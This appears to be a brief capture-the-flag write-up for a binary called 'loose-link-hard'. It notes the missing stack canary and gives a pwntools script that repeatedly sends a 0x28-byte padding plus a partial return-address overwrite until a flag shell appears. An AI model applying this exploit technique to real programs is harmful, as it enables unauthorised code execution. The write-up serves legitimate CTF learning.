![](img/Loose%20Link%20Hard-1780638910530.webp)
![](img/Loose%20Link%20Hard-1780638924796.webp)

reading the pseudo code, and the asm code, we acknowledge that this program let us overflow the binary, and it possess no canary, thus the task is a simple buffer overflow

```
#!/usr/bin/python3
from pwn import *

while True:
    p=process("../loose-link-hard")
    payload=b"A"*0x28+b"\xe7\x19"

    time.sleep(0.2)
    p.send(payload)

    try:
        p.recvuntil("flag", timeout=1.5)
        p.interactive()
    except:
        pass
```